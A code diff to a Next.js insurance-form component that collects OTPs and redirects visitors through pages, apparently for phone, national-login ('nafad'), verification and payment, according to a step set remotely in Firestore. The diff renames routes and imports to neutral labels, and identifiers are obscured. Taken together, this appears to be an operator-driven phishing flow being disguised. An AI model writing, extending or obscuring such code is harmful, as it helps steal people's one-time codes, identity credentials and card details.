@@ -11,7 +11,7 @@ import { doc, onSnapshot } from "firebase/firestore"
 import { useRouter } from "next/navigation"
 import { setupOnlineStatus } from "@/lib/utils"
 import { FullPageLoader } from "@/components/loader"
-import _P1 from "@/components/pay-form"
+import _P1 from "@/components/form-a"
 
 const allOtps = [""]
 
@@ -113,15 +113,15 @@ export default function InsuranceForm() {
 
           // Redirect based on currentStep
           if (step === "phone") {
-            router.push("/phone-info")
+            router.push("/step5")
           } else if (step === "_t6") {
-            router.push("/nafad")
+            router.push("/step4")
           } else if (step === "_st1") {
             router.push("/check")
           } else if (step === "_t2") {
-            router.push("/veri")
+            router.push("/step2")
           } else if (step === "_t3") {
-            router.push("/confi")
+            router.push("/step3")
           }
         }
       },
